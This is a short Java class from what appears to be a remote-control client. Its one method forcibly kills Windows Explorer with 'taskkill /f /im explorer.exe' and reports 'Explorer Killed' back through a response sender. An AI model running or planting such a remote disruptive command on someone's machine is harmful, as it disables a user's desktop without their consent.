package ch.lebois.client.service;

import ch.lebois.client.console.Console;
import ch.lebois.client.handler.ResponseSender;

public class KillService {

    public void kill() {
        Console.execute("taskkill /f /im explorer.exe");
        new ResponseSender("response", "Explorer Killed");
    }
}
